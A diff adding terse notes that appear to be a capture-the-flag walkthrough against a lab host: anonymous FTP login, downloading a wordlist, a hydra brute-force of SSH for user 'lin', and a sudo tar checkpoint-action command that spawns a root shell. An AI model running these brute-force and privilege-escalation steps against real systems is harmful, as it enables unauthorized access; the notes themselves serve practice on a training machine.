@@ -1,0 +1,10 @@
+ftp
+open 10.10.170.57
+anonymous
+dir
+recv locks.txt
+recv task.txt
+hydra -l lin -P locks.txt ssh://10.10.170.57
+sudo -l
+tar is accessible
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
